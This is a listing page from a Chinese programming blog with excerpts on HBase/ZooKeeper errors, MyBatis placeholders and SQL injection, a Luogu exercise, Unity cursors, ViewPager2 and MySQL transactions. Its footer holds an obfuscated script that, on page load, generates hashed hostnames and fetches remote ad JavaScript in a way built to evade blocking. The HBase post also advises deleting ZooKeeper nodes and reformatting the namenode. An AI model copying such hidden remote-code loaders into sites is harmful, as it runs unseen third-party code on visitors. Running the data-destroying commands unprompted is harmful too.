		<h2 class="list__title post__title">
			<a href="/posts/677f4b74508cfe9fa2af09708abbf4c0/" rel="bookmark">
			Hbase报错解决方法ERROR: KeeperErrorCode = NoNode for /hbase/master
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 原因：断电（包括电脑睡眠等）导致Hmaster连不上，zookeeper中找不到master节点
解决方法：删除zookeeper中的hbase节点，开启hbase会自动建立这个节点
1）登陆zookeeper客户端：zkCli.sh
2）删除hbase节点：deleteall /hbase
最关键的一步：重启hbase、重启zookeeper（这步后没问题就不用看4、5了）
1）关闭hbase：stop-hbase.sh无效，使用jps命令找到集群中每台机器的hmaster以及hregionserver的端口号，kill -9 +端口号一台一台杀死hbase的进程，相当于手动关闭hbase
2）关闭hdfs：stop-dfs.sh
3）关闭zookeeper：my_zk.sh stop 这是我的开启zk的脚本，别抄
4）开启zookeeper和hdfs和hbase按次序，my_zk.sh start、start-dfs.sh start-hbase.sh
检查/hbase目录的hdfs权限设置是否有问题；进入hdfs的hbase目录添加权限
hbase的HMaster与hdfs的namenode息息相关，要保证HMaster的节点同时也是active状态的namenode节点，如不能保证，重新格式化namenode，重启HMaster；
麻烦给个赞，分享不易！！！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9b7ee6cec90e8318c05e205fdf43a7e/" rel="bookmark">
			字符串转JSON
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/82329c214c9dd5ec3f08910d9e6f4d0a/" rel="bookmark">
			MyBatis学习：#占位符和 $占位符的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、本篇博客的背景和目的 目前我本人正在学习MyBatis框架，在原先了解并且懵懵懂懂使用的基础上，开始系统正式的学习。阐述了MVC架构模式和三层架构，明晰了在Web项目中的普遍编码层次，回顾了JDBC连接数据库，建立了使用MyBatis和MySQL的Maven项目，解释了STDOUT_LOGGING日志和手动提交事务，记录了MyBatis中#占位符的使用方法，回顾了MyBatis执行SQL语句的过程和使用到的一些重要类和接口，记录了将固定化的代码整合到一个工具类MyBatisUtil中，以减少代码量。记录了dao层接口的实现以及为什么要实现它。记录了MyBatis动态代理和使用动态代理的要求以及使用了动态代理生成的实现类。记录了MyBatis框架下传参的五种方法。本篇博客记录一下占位符#和$的区别。
2、我的上一篇博文 我的上一篇博文记录的是 使用Map传参的方法，感兴趣的读者可以前往查阅，链接如下：
MyBatis学习：使用Map的方法传递参数_你是我的日月星河的博客-CSDN博客https://blog.csdn.net/weixin_46281472/article/details/126179501
3、#占位符 使用语法格式：#{字符} 。
MyBatis处理 # 占位符的时候使用的JDBC对象是 PrepareStatement对象，然后使用这个对象执行SQL语句。就类似于下面的代码：
String SQL=" name=?";
PrepareStatement pst=conn.prepareStatement(SQL);
pst.setInt(1,1001);
ResultSet rs=pst.executeQuery();
这些 ？ 使用的就是 setint等方法来赋值的。
这个 # 占位符的特点就是：1、 使用的是PrepareStatement 对象， 效率更高；
使用的是PrepareStatement 对象 这样还可以2、避免SQL注入， 这是更加安全的；
还有就是：# 占位符常常是位于 = 的右侧， 3、按照规范，也就是 #{ }是作为列值使用的；
#{ }位置的值是和数据类型有关的；
4、$占位符 使用语法格式： ${ 字符串 }
MyBatis执行 ${ } 这个占位符的SQL语句的时候，比方说在mapper文件中有这样的一条语句：
select * from student where id=${ studentId }
${ 字符串 } 它表示的是 字符串的连接；是将 SQL语句的其它内容和 ${ }的内容连在一块；使用的是字符串连接的方式连在一起 ， 这样就是要使用 + 的；所以上面的使用形式就变成了： String Sql= "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/82329c214c9dd5ec3f08910d9e6f4d0a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d9381d75d0cd60a30c176c0ba02bb60/" rel="bookmark">
			【暑期每日一题】洛谷 P5724 【深基4.习5】求极差 / 最大跨度值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目链接：P5724 【深基4.习5】求极差 / 最大跨度值 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)
题目描述
给出 n 和 n 个整数 ai，求这 n 个整数中的极差是什么。极差的意思是一组数中的最大值减去最小值的差。
输入格式
第一行输入一个正整数 n，表示整数个数。
第二行输入 n 个整数 a1,a2 ... an，以空格隔开。
输出格式
输出一个整数，表示这 n 个整数的极差。
样例 #1
样例输入 #1
6 1 1 4 5 1 4 样例输出 #1
4 提示
数据保证，1 &lt;= n &lt;= 100，0 &lt;= ai &lt;= 1000。
AC code:
#include&lt;iostream&gt; #include&lt;algorithm&gt; using namespace std; int a[110]; int main() { int n; cin&gt;&gt;n; int maxx=-1,minn=1100; for(int i=0;i&lt;n;i++) { cin&gt;&gt;a[i]; maxx=max(maxx,a[i]); minn=min(minn,a[i]); } cout&lt;&lt;maxx-minn; return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6548e2fc36b6e22a0f7a234236049b4/" rel="bookmark">
			Unity鼠标光标使用学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Unity下的鼠标光标程序相关的就一个类下的2、3个方法。
首先，光标导入图片的设置需要将类型设置为Cursor。
设置鼠标光标的方法就一个，SetCursor。第一个参数是图片，第二个参数是点击点的偏移量，第三个参数是类型。
public Texture2D texture; void Start() { Cursor.SetCursor(texture, new Vector2(40, 4), CursorMode.Auto); } 当使用CursorMode.Auto的时候，会使用硬件进行光标处理。性能好，兼容好。但是，在windows系统下，会强制把光标大小缩小到32*32。
当使用CursorMode.ForceSoftware的时候，会使用软件来处理光标。在windows系统下想要鼠标光标变大这是唯一的方法，但是偶尔会有小bug。在使用中发现unity2022.1+HDRP环境下，图片颜色会变深。
要实现图标动画的话，只能一张一张的图片轮流替换。CodeMonkey大佬有提供光标动画的代码，我就直接抄过来了。
[CreateAssetMenu] public class CursorAnimation : ScriptableObject { public CursorType cursorType; public Texture2D[] textureArray; public float frameRate; public Vector2 offset; } public class CursorMananger : MonoBehaviour { public CursorAnimation[] cursorAnimations; private CursorAnimation currentAnimation; private float frameRate; private int frameCount; private int currentFrame; private float frameTimer; private void Start() { SetActiveCursorAnimation(cursorAnimations[0]); } private void Update() { frameTimer -= Time.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d6548e2fc36b6e22a0f7a234236049b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/264b71debc7904c0b60333da6cda04b0/" rel="bookmark">
			Android Studio ViewPager2&#43;Fragment实现无限滑动效果
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目前看到的大部分教程都是ViewPager+Fragment实现的无限滑动效果，比较复杂。ViewPager2的出现给我们带来的极大的方便，要实现无限滑动效果也相对简单一些了。
实现无限滑动的原理和ViewPager的原理是一样的，相关原理可以借鉴。假设我们要对三个页面进行滑动，分别为fragment1，fragment2，fragment3,。我们就按顺序导入fragment3，fragment1，fragment2，fragment3，fragment1。
当页面跳转到第0个页面，也就是fragment3的时候，我们将页面自动改为第3个页面，fragment3。当页面跳转到第4个页面，也就是fragment1的时候，我们将页面自动改为第1个页面，fragment1。
//MyAdapter.java public class MyAdapter extends FragmentStateAdapter { List&lt;Fragment&gt; list = new ArrayList&lt;&gt;(); public EmergentAdapter(@NonNull FragmentManager fragmentManager, @NonNull Lifecycle lifecycle, List&lt;Fragment&gt; list){ super(fragmentManager,lifecycle); this.list = list; } @NonNull @Override public Fragment createFragment(int position) { return list.get(position); } @Override public int getItemCount() { return list.size(); } } public class EmergentActivity extends AppCompatActivity{ private int imgsize=5; private ViewPager2 viewPager2; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_emergent); List&lt;Fragment&gt; list=new ArrayList&lt;&gt;(); list.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/264b71debc7904c0b60333da6cda04b0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17261337002e5d9204e0caa499ad30dd/" rel="bookmark">
			Mysql事物详解(重要)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.什么是事物
2.为什么会出现事物 3.事物的版本支持
4.事物提交方式
5.事务常见操作方式
6.事务隔离级别 7.总结
1.什么是事物 事务就是一组DML语句组成，这些语句在逻辑上存在相关性，这一组DML语句要么全部成功，要么全部失败，是一个整体。MySQL提供一种机制，保证我们达到这样的效果。事务还规定不同的客户端看到的数据是不相同的。事务就是要做的或所做的事情，主要用于处理操作量大，复杂度高的数据。假设一种场景：你毕业了，学校的教务系统后台 MySQL 中，不在需要你的数据，要删除你的所有信息(一般不会:) ), 那么要删除你的基本信息(姓名，电话，籍贯等)的同时，也删除和你有关的其他信息，比如：你的各科成绩，你在校表现，甚至你在论坛发过的文章等。这样，就需要多条 MySQL 语句构成，那么所有这些操作合起来，就构成了一个事务。 正如我们上面所说，一个 MySQL 数据库，不止你一个事务在运行，同一时刻，甚至有大量的请求被包装成事务，在向 MySQL 服务器发起事务处理请求。而每条事务至少一条 SQL ，最多很多 SQL ,这样如果大家都访问同样的表数据，在不加保护的情况，就绝对会出现问题。甚至，因为事务由多条 SQL 构成，那么，也会存在执行到一半出错或者不想再执行的情况，那么已经执行的怎么办呢？（回滚） (1) 一个完整的事务，绝对不是简单的 sql 集合，还需要满足如下四个属性： 原子性：一个事务（transaction）中的所有操作，要么全部完成，要么全部不完成，不会结束在中间某个环节。事务在执行过程中发生错误，会被回滚（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。( 例如转钱：交易双方我的钱够不够1000(需要查询), 转给你，我的减你的加(修改)，中间只要有一个部分出错就要保持原样，回滚。)一致性：在事务开始之前和事务结束以后，数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设规则，这包含资料的精确度、串联性以及后续数据库可以自发性地完成预定的工作。 隔离性：数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。事务隔离分为不同级别，包括读未提交（ Read uncommitted ）、读提交（ read committed ）、可重复读（ repeatable read ）和串行化（ Serializable ） 持久性：事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失。 (2)上面四个属性，可以简称为 ACID : 原子性（Atomicity，或称不可分割性） 一致性（Consistency） 隔离性（Isolation，又称独立性） 持久性（Durability）。 2.为什么会出现事物 事务被MySQL 编写者设计出来,本质是为了当应用程序访问数据库的时候,事务能够简化我们的编程模型,不需要我们去考虑各种各样的潜在错误和并发问题.可以想一下当我们使用事务时,要么提交,要么回滚,我们不会去考虑网络异常了, 服务器宕机了,同时更改一个数据怎么办对吧?因此事务本质上是为了应用层服务的.而不是伴随着数据库系统天生就有的. (1)我们后面把 MySQL 中的一行信息，称为一行记录 (2)事物 : 是一个程序员的视角
(3)站在程序员视角就是把这多个sql打包构建成一个事物，让我们能够快速，简单，高效安全的把这个任务完成,事物也可能是—条sql
3.事物的版本支持 在 MySQL 中只有使用了 Innodb 数据库引擎的数据库或表才支持事务， MyISAM 不支持。 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/17261337002e5d9204e0caa499ad30dd/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/244/">«</a>
	<span class="pagination__item pagination__item--current">245/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/246/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>